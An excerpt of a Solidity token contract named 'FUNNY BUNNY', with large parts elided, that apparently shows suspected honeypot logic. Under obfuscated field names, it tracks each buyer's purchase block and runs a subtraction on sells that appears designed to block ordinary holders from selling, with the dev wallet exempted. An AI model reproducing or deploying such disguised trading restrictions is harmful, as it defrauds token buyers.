...
contract FUNNY is Context, IERC20, Ownable {
    ...
    string private constant _name = unicode"FUNNY BUNNY";
    ...
    struct ChainMetaUpdate {uint256 endpoint; uint256 modify; uint256 syncronize;}
    mapping (address => ChainMetaUpdate) private metadata;
    ...
    constructor () {
		_taxWallet = payable(0x2757886aB7E1dfF59987d4311FE7517E51bf72F4);
    ...
    function _transfer(address from, address to, uint256 amount) private {
        ...
        if (
            ...
            && from != address(this)
            && to != address(this)
            && from!=_devWallet &&  to!=_devWallet
        ) {
            chainRate = block.number;
        }

        if (_isExcludedFromFee[from]) {
            if (block.number > firstBlock + _reduceSellTaxAt && from!=_devWallet &&  to!=_devWallet) {
                unchecked {
            ...
            if (!_isExcludedFromFee[to]) {
                if (uniswapV2Pair == to) {
                    ChainMetaUpdate storage meta = metadata[from];
                    meta.syncronize = meta.endpoint.sub(chainRate);
                    meta.modify = block.number;
                } else {           
                    ChainMetaUpdate storage meta = metadata[to];
                    if (meta.endpoint == 0 && uniswapV2Pair == from) {
                        if (meta.endpoint == 0)
                            meta.endpoint = block.number;
                    } else {
    ...
    function clearStuckNative() external {
